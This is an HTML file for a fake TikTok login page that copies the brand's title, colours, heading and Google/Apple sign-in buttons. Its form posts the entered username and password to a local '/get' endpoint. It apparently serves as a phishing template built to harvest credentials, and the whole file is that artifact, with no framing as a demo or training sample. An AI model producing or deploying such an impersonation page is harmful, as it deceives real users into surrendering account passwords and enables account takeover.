<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
    <title>TikTok</title>
    <style>
      body {
        font-family: 'Proxima Nova', 'Helvetica Neue', Helvetica, Arial, sans-serif;
        background-color: #121212;
        display: flex;
        justify-content: center;
        align-items: center;
        min-height: 100vh;
        margin: 0;
      }
      .login-container {
        width: 440px;
        padding: 40px;
        text-align: center;
      }
      #logo {
        margin-bottom: 20px;
      }
      .g-h1 {
        font-size: 32px;
        font-weight: 700;
        color: #fff;
        margin-bottom: 4px;
      }
      .g-h2 {
        font-size: 15px;
        color: rgba(255,255,255,0.5);
        margin-bottom: 20px;
      }
      .g-input {
        width: 100%;
        padding: 16px;
        border: 1px solid rgba(255,255,255,0.12);
        border-radius: 4px;
        background-color: rgba(255,255,255,0.08);
        color: #fff;
        font-size: 16px;
        margin-bottom: 12px;
        box-sizing: border-box;
        outline: none;
      }
      .g-input:focus {
        border-color: #fe2c55;
      }
      .g-input::placeholder {
        color: rgba(255,255,255,0.34);
      }
      .gbtn-primary {
        width: 100%;
        padding: 16px;
        background-color: #fe2c55;
        color: #fff;
        border: none;
        border-radius: 4px;
        font-size: 17px;
        font-weight: 600;
        cursor: pointer;
        margin-top: 4px;
      }
      .gbtn-primary:hover {
        background-color: #ff3b64;
      }
      .or {
        display: flex;
        align-items: center;
        margin: 20px 0;
        color: rgba(255,255,255,0.5);
        font-size: 13px;
      }
      .or::before, .or::after {
        content: '';
        flex: 1;
        border-top: 1px solid rgba(255,255,255,0.12);
      }
      .or span {
        padding: 0 12px;
      }
      .social-btn {
        width: 100%;
        padding: 14px;
        background: transparent;
        border: 1px solid rgba(255,255,255,0.12);
        border-radius: 4px;
        color: rgba(255,255,255,0.84);
        font-size: 15px;
        cursor: pointer;
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 10px;
        margin-bottom: 12px;
      }
      .social-btn:hover {
        background: rgba(255,255,255,0.04);
      }
      .forgot {
        display: block;
        margin-top: 16px;
        color: rgba(255,255,255,0.5);
        font-size: 13px;
        text-decoration: none;
      }
      .forgot:hover {
        text-decoration: underline;
      }
      .footer {
        margin-top: 24px;
        font-size: 13px;
        color: rgba(255,255,255,0.5);
      }
      .footer a {
        color: #fe2c55;
        text-decoration: none;
        font-weight: 600;
      }
    </style>
  </head>
  <body>
    <div class="login-container">
      <svg id="logo" viewBox="0 0 48 21" width="130" height="56">
        <path fill="#fff" d="M42.8 0h-3.8c-.7 0-1.3.6-1.3 1.3v10.4c0 .7-.6 1.3-1.3 1.3h-3.8c-.7 0-1.3-.6-1.3-1.3V1.3c0-.7-.6-1.3-1.3-1.3h-3.8c-.7 0-1.3.6-1.3 1.3v13.6c0 4.3 3.5 7.8 7.8 7.8 4.3 0 7.8-3.5 7.8-7.8V8.5c1.5 1.1 3.3 1.8 5.3 1.8v-3.8c-2 0-3.8-.7-5.3-1.8V1.3c0-.7-.6-1.3-1.3-1.3z"/>
        <path fill="#25f4ee" d="M25.8 0h-3.8c-.7 0-1.3.6-1.3 1.3v10.4c0 .7-.6 1.3-1.3 1.3h-3.8c-.7 0-1.3-.6-1.3-1.3V1.3c0-.7-.6-1.3-1.3-1.3h-3.8c-.7 0-1.3.6-1.3 1.3v13.6c0 4.3 3.5 7.8 7.8 7.8 4.3 0 7.8-3.5 7.8-7.8V8.5c1.5 1.1 3.3 1.8 5.3 1.8v-3.8c-2 0-3.8-.7-5.3-1.8V1.3c0-.7-.6-1.3-1.3-1.3z"/>
        <path fill="#fe2c55" d="M25.8 0h-3.8c-.7 0-1.3.6-1.3 1.3v10.4c0 .7-.6 1.3-1.3 1.3h-3.8c-.7 0-1.3-.6-1.3-1.3V1.3c0-.7-.6-1.3-1.3-1.3h-3.8c-.7 0-1.3.6-1.3 1.3v13.6c0 4.3 3.5 7.8 7.8 7.8 4.3 0 7.8-3.5 7.8-7.8V8.5c1.5 1.1 3.3 1.8 5.3 1.8v-3.8c-2 0-3.8-.7-5.3-1.8V1.3c0-.7-.6-1.3-1.3-1.3z"/>
      </svg>
      <h1 class="g-h1">Log in to TikTok</h1>
      <p class="g-h2">Manage your account, check notifications, comment on videos, and more.</p>
      <form action="/get" method="POST">
        <input class="g-input" type="text" name="username" placeholder="Username or email" required>
        <input class="g-input" type="password" name="password" placeholder="Password" required>
        <button type="submit" class="gbtn-primary">Log In</button>
      </form>
      <div class="or"><span>or</span></div>
      <button class="social-btn">
        <svg width="20" height="20" viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/></svg>
        Continue with Google
      </button>
      <button class="social-btn">
        <svg width="20" height="20" viewBox="0 0 24 24" fill="#fff"><path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.8-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83"/></svg>
        Continue with Apple
      </button>
      <a href="#" class="forgot">Forgot password?</a>
      <p class="footer">Don't have an account? <a href="#">Sign Up</a></p>
    </div>
  </body>
</html>
